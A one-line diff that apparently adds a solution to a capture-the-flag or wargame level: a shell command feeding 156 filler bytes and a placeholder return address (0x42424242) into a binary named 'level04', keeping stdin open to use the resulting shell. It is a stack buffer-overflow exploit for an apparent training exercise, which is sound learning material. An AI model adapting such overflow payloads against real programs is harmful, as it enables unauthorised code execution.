@@ -1,0 +1,1 @@
+( python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*156+struct.pack("<I",0x42424242)+b"\n")' ; cat ) | ./level04
